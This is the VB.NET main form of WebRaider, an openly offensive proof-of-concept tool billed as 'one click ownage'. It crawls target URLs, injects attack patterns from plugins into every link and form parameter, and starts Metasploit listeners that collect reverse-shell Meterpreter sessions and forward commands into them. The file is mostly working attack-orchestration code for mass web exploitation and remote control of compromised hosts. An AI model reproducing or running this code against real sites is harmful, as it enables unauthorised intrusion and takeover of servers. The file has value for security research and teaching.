#Region "ABOUT"

'WebRaider originally developed by Ferruh Mavituna ( Mavituna Security Ltd. - www.mavitunasecurity.com )  as PoC to mass one click ownage attack. It's developed in really short time as a pet project and proof of concept, expect many bugs and huge limitations.
'
'Mesut Timur ( Mavituna Security Ltd. - www.mavitunasecurity.com ) picked up the project and helped development to get it ready for release.
'
'The whole application developed very quickly and in a dirty way. There is no plan to continue maintaining the tool. Since it's PoC, code quality is literally very bad. 

#End Region

#Region "LICENCE"
'  This program is free software: you can redistribute it and/or modify
'  it under the terms of the GNU General Public License as published by
'  the Free Software Foundation, either version 3 of the License.

'  This program is distributed in the hope that it will be useful,
'  but WITHOUT ANY WARRANTY; without even the implied warranty of
'  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
'  GNU General Public License for more details.

'  You should have received a copy of the GNU General Public License
'  along with this program.  If not, see <http://www.gnu.org/licenses/>.
#End Region


Imports System.ComponentModel.Composition.Hosting
Imports System.ComponentModel.Composition
Imports WebRaider.Plugins.Raider
Imports WebRaider.Plugins.Parser
Imports WebRaider.SharedLibrary
Imports System.Threading
Imports System.Runtime.Serialization.Formatters.Binary


''' <summary>
''' WebRaider One Click Ownage Tool!
''' </summary>
''' <remarks></remarks>
Public Class Main

#Region "Plugin"


    <Import()> _
    Public Shared RaiderPlugins As IEnumerable(Of IRaider)

    Public Shared RaiderPluginsReader As New List(Of IRaider)

    <Import()> _
    Public ParserPlugins As IEnumerable(Of IParser)

    Private Sub FormSetup()
        'Set Default Tag
        TxtShell0.Tag = 0

        If Not IO.File.Exists(My.Settings.RubyExecutable) Then
            If DlgRuby.ShowDialog = Windows.Forms.DialogResult.OK Then
                My.Settings.RubyExecutable = DlgRuby.FileName
            End If
        End If

        If Not IO.Directory.Exists(My.Settings.MsfcliPath) Then
            If DlgMsfcli.ShowDialog = Windows.Forms.DialogResult.OK Then
                My.Settings.MsfcliPath = IO.Path.GetDirectoryName(DlgMsfcli.FileName)
            End If
        End If

        My.Settings.Save()

        WebRaider.SharedLibrary.Options.GroupNumber = Convert.ToInt32(My.Settings.GroupNumber.ToString)
        WebRaider.SharedLibrary.Options.ParameterType = My.Settings.ParameterType.ToString

        Me.Text = String.Format(Me.Text, My.Application.Info.Version)
        LoadPlugin("Plugins/Raiders/", LstPlugins, True)
        LoadPlugin("Plugins/Parsers/", LstPlugins, False)

        If My.Settings.TargetComplete IsNot Nothing Then
            'Set Autocomplete Custom Source
            TxtURL.AutoCompleteMode = AutoCompleteMode.SuggestAppend
            TxtURL.AutoCompleteSource = AutoCompleteSource.CustomSource

            Dim TargetList(My.Settings.TargetComplete.Count - 1) As String
            My.Settings.TargetComplete.CopyTo(TargetList, 0)

            TxtURL.AutoCompleteCustomSource.AddRange(TargetList)
        End If

    End Sub

    Private Sub LstPlugins_ItemChecked(ByVal sender As Object, ByVal e As System.Windows.Forms.ItemCheckedEventArgs) Handles LstPlugins.ItemChecked
        If e.Item.Tag Is Nothing OrElse TypeOf (e.Item.Tag) Is IParser Then Exit Sub
        DirectCast(e.Item.Tag, IRaider).Enabled = e.Item.Checked
    End Sub


    ''' <summary>
    ''' Loads the plugins.
    ''' </summary>
    ''' <param name="folder">The folder.</param>
    ''' <param name="list">The list.</param>
    ''' <param name="loadRaiders">if set to <c>true</c> [load raiders].</param>
    Private Sub LoadPlugin(ByVal folder As String, ByVal list As ListView, ByVal loadRaiders As Boolean)

        'Load Plugins
        Dim catalog As New DirectoryCatalog(folder, True)
        Dim container As New CompositionContainer(catalog) '
        Dim batch As New CompositionBatch()
        batch.AddPart(Me)
        Try
            container.Compose(batch)
        Catch ex As CompositionException
            Console.WriteLine(ex.ToString())
        End Try

        Dim AddedListItem As ListViewItem
        If loadRaiders Then
            For Each CurrentPlugin In Me.RaiderPlugins
                CurrentPlugin.Setup()
                Me.RaiderPluginsReader.Add(CurrentPlugin)
                AddedListItem = list.Items.Add(CurrentPlugin.Name)
                AddedListItem.SubItems.Add("Raider")
                AddedListItem.Tag = CurrentPlugin
                AddedListItem.Checked = True
            Next

        Else
            For Each CurrentPlugin In Me.ParserPlugins
                AddedListItem = list.Items.Add(CurrentPlugin.Name)
                AddedListItem.SubItems.Add("Parser")
                AddedListItem.Tag = CurrentPlugin
                AddedListItem.Checked = True
            Next

        End If

    End Sub

#End Region

#Region "Form Load"

    Private Sub Main_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        'Close all shells
        Try
            For Each Shell As KeyValuePair(Of String, ShellListener) In Me.Shells
                Shell.Value.Dispose()
            Next
        Catch ex As Exception
            'We don't care, do we ?
        End Try
    End Sub

    Private Sub Main_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

		If My.Settings.FirstRun Then
			MessageBox.Show("This is the first time you are running WebRaider, you need to generate a reverse shell executable first. Check the options now and confirm your settings." & vbNewLine & vbNewLine & "You need to do this everytime your IP changes.", "First time setup", MessageBoxButtons.OK, MessageBoxIcon.Information)
			Options.ShowDialog(Me)
			My.Settings.FirstRun = False
		End If

		FormSetup()
		LoadPayload()
		StartNewShell()
    End Sub

    Private Sub LoadPayload()
        TxtPayload.Text = Web.HttpUtility.UrlEncode(RaiderPluginsReader(0).Attacks(0).Pattern)
        TxtPayload.Text &= vbNewLine & vbNewLine & RaiderPluginsReader(0).Attacks(0).Pattern
    End Sub


#End Region


#Region "Scanning and Attacking"

    Private Sub BtnStart_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BtnStart.Click
        SaveAutoCompleteData(TxtURL.Text)
        Dim Thr As New Thread(AddressOf StartAttack)
        Thr.Start(TxtURL.Text)

        'StartAttack()
    End Sub

    ''' <summary>
    ''' Adds a new entry to the auto complete data.
    ''' </summary>
    ''' <param name="url">The URL.</param>
    Private Sub SaveAutoCompleteData(ByVal url As String)
        If My.Settings.TargetComplete Is Nothing Then My.Settings.TargetComplete = New Collections.Specialized.StringCollection()

        If My.Settings.TargetComplete.Count > 5 Then My.Settings.TargetComplete.RemoveAt(0)
        My.Settings.TargetComplete.Add(url)

        My.Settings.Save()
    End Sub

    ''' <summary>
    ''' Starts the attack.
    ''' </summary>
    ''' <param name="url">The URL.</param>
    Public Sub StartAttack(ByVal urlObj As Object)

        For Each CurrentTargetUrl As String In Split(DirectCast(urlObj, String), vbNewLine)

            Dim AttackUri As Uri
            If Not Uri.TryCreate(CurrentTargetUrl, UriKind.Absolute, AttackUri) Then
                Continue For
            End If

            Dim Link As New Link(AttackUri)
            Dim AttackResponse As AttackResponse = Attack(Link)

            If AttackResponse Is Nothing Then
                AppendText(String.Format("No response: {0}", Link.RequestUri), TxtShell0)
                Exit Sub
            End If

            Dim CurrentParser As IParser = ParserPlugins(0)
            CurrentParser.Setup(AttackResponse.SourceCode, Link.Url)
            CurrentParser.Parse()

            Dim AllLinks As New List(Of Link)

            'Add Found Links
            If CurrentParser.Links IsNot Nothing Then
                For Each LinkStr As String In CurrentParser.Links
                    Dim CurrentLink As New Link(New Uri(AttackUri, LinkStr))
                    CurrentLink.UriManager = New UriManager(CurrentLink.Url)
                    AllLinks.Add(CurrentLink)
                Next
            End If

            'Add Forms
            If CurrentParser.Forms IsNot Nothing Then
                For Each ParsedForm As WR.Form In CurrentParser.Forms
                    AllLinks.Add(ParsedForm.GetAsLink(AttackResponse))
                Next
            End If

            For Each currentLink As Link In AllLinks

                For Each CurrentRaider As IRaider In Main.RaiderPluginsReader.Where(Function(f) f.Enabled = True)

                    AppendText(currentLink.Url.ToString & vbNewLine, TxtShell0)

                    'Link
                    For Each Param As Parameter In currentLink.UriManager.Params.ToArray()

                        'Let's get a copy so won't touch the link
                        Dim attackLink As Link = DeepClone(Of Link)(currentLink)


                        For Each AttackPattern As AttackPattern In CurrentRaider.Attacks
                            If CurrentRaider.PrepareAttack(attackLink, Param, AttackPattern) Then

                                Dim AttackRes As AttackResponse = Attack(attackLink)
                                Debug.Write(".")

                            Else
                                AppendText(String.Format("{0}: Attack Skipped by the plugin.{1}", Param.Name, vbNewLine), TxtShell0)
                            End If

                        Next

                    Next

                Next


            Next

            'Just stupidly wait before attacking to other URL
            Thread.Sleep(12000)
        Next CurrentTargetUrl
    End Sub


    Public Function Attack(ByVal link As Link) As AttackResponse

        Dim HttpReq As HttpRequest = Nothing

        Try
            HttpReq = New HttpRequest(link)

        Catch ex As Exception
            Debug.Assert(False, ex.Message)

        End Try

        Dim AttackResponse As AttackResponse = HttpReq.Request()
        Return AttackResponse
    End Function


#End Region



#Region "Helper"
    Public Delegate Sub DelAppendText(ByVal data As String, ByVal textControl As TextBox)
    Private Sub AppendText(ByVal data As String, ByVal textControl As TextBox)
        If InvokeRequired Then
            BeginInvoke(New DelAppendText(AddressOf AppendText), data, textControl)
        Else
            textControl.AppendText(data)
        End If
    End Sub


#End Region



#Region "VB Packer"


#End Region

#Region "Shell"

    Private Const TextBoxProt As String = "TxtShell"
    Private Shells As New Dictionary(Of String, ShellListener)

    Public Function RefreshShells() As Boolean
        SyncLock ShellLock
            For Each Shell As KeyValuePair(Of String, ShellListener) In Me.Shells
                Shell.Value.Close()
            Next
            Me.Shells.Clear()

        End SyncLock
        Invoke(New Action(AddressOf Me.TxtShell0.Clear))
        StartNewShell()

        Return True
    End Function
    Private Sub AddNewTab(ByVal shellName As String)
        'Dim NewTabPage As TabPage = CType(CloneControl.Clone(TabShells.TabPages(TabShells.TabPages.Count - 1)), TabPage)
        'NewTabPage.Name = 
        'NewTabPage.Text = 

        Dim TabPage As New TabPage("Listener " & shellName)
        TabPage.Name = "Tab" & shellName
        TabPage.Tag = shellName

        Dim TextBox As New TextBox()
        With TextBox
            .Tag = shellName
            .Dock = DockStyle.Fill
            .AppendText("Starting a new listener..." & vbNewLine)
            .Name = "TxtShell" & shellName
            .Font = TxtShell0.Font
            .ScrollBars = TxtShell0.ScrollBars
            .Multiline = True
        End With

        'Add Controls
        TabPage.Controls.Add(TextBox)
        TabShells.TabPages.Add(TabPage)
    End Sub


    Private ShellLock As New Object
    ''' <summary>
    ''' Spawn a new shell and returns the shell name (thread-safe)
    ''' </summary>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Function StartNewShell() As String

        SyncLock ShellLock

            Dim ShellName As String = String.Format(Shells.Count.ToString())
            Dim MetasploitSession As New ShellListener(ShellName)

            If Shells.Count > 0 Then
                'Add Tab and Stuff
                Invoke(New Action(Of String)(AddressOf AddNewTab), ShellName)

            End If

            Dim Thr As New Threading.Thread(AddressOf MetasploitSession.Listen)
            AddHandler MetasploitSession.DataReceived, AddressOf ReadData
            Thr.Start()

            Shells.Add(ShellName, MetasploitSession)
            Return ShellName

        End SyncLock

    End Function


#End Region


    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BtnStartListener.Click
        StartNewShell()
    End Sub

    Private Sub ReadData(ByVal sender As Object, ByVal e As System.Diagnostics.DataReceivedEventArgs)
        If e.Data Is Nothing Then Exit Sub

        Dim DataOut As String = e.Data

        If DataOut = "[*] Starting the payload handler..." AndAlso BtnStart.Enabled Then
            ContSetButton(BtnStartListener, "Listening...", False)

        ElseIf DataOut.StartsWith("[*] Meterpreter session") Then
            My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Asterisk)
            IncreaseShellCount()
            StartNewShell()

        End If

        Dim ShellListener As ShellListener = DirectCast(sender, ShellListener)

        Dim FoundControls() As Control = Me.Controls.Find(TextBoxProt & ShellListener.Name, True)
        If FoundControls Is Nothing OrElse FoundControls.Length = 0 Then Exit Sub

        Dim TextboxToWrite As TextBox = DirectCast(FoundControls(0), TextBox)

        DataOut &= vbNewLine

        AppendText(DataOut, TextboxToWrite)
    End Sub

    Private Sub ContSetButton(ByVal button As Button, ByVal label As String, ByVal enabled As Boolean)
        Try
            If (button.IsHandleCreated = False) Then
                Invoke(New Action(Of Button, String, Boolean)(AddressOf SetButton), button, label, enabled)
            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub SetButton(ByVal button As Button, ByVal label As String, ByVal Enabled As Boolean)
        button.Text = label
        button.Enabled = Enabled
    End Sub

    Private Sub IncreaseShellCount()
        Invoke(New Action(AddressOf ALTIncreaseShellCount))
    End Sub

    Private Sub ALTIncreaseShellCount()
        Dim CurrentCount As Integer
        If Integer.TryParse(LblShell.Text, CurrentCount) Then
            LblShell.Text = (CurrentCount + 1).ToString()
        End If
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BtnSend.Click
        Sendcommand()
    End Sub

    Private Sub TxtInp_TextChanged(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TxtInp.KeyUp

        If e.KeyCode = Keys.Enter Then
            e.Handled = True
            Sendcommand()
            TxtInp.Clear()
            TxtInp.Focus()
        End If

    End Sub

    Private Sub Sendcommand()
        If Me.Shells Is Nothing OrElse Me.Shells.Count = 0 Then Exit Sub

        Dim ActiveSession As ShellListener = Me.Shells(CStr(TabShells.SelectedTab.Controls(0).Tag))
        ActiveSession.SendCommand(TxtInp.Text)

    End Sub

    Private Sub OptionsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OptionsToolStripMenuItem.Click

    End Sub

    Private Sub HelpToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles HelpToolStripMenuItem.Click
        WebRaider.SharedLibrary.Helpers.RunProcess("http://code.google.com/p/webraider/w/list")
    End Sub

    Private Sub ReportABugToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ReportABugToolStripMenuItem.Click
        WebRaider.SharedLibrary.Helpers.RunProcess("http://code.google.com/p/webraider/issues/list")
    End Sub

    Private Sub AboutToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AboutToolStripMenuItem1.Click
        About.ShowDialog(Me)
    End Sub

    Private Sub OptionsToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OptionsToolStripMenuItem1.Click
        Options.ShowDialog(Me)
    End Sub

    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem.Click
        Me.Close()
    End Sub

    ''' <summary>
    ''' Deeps the clone the object.
    ''' </summary>
    ''' <typeparam name="T"></typeparam>
    ''' <param name="obj">The obj.</param>
    ''' <returns></returns>
    ''' <remarks>Object should serilizable</remarks>
    Public Shared Function DeepClone(Of T)(ByVal obj As T) As T
        Using ms As New IO.MemoryStream()
            Dim formatter As New BinaryFormatter()
            formatter.Serialize(ms, obj)
            ms.Position = 0

            Return DirectCast(formatter.Deserialize(ms), T)
        End Using
    End Function

	Private Sub OneClickOwnageToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OneClickOwnageToolStripMenuItem.Click
		RunProcess(My.Settings.WebraiderURL)
	End Sub
End Class
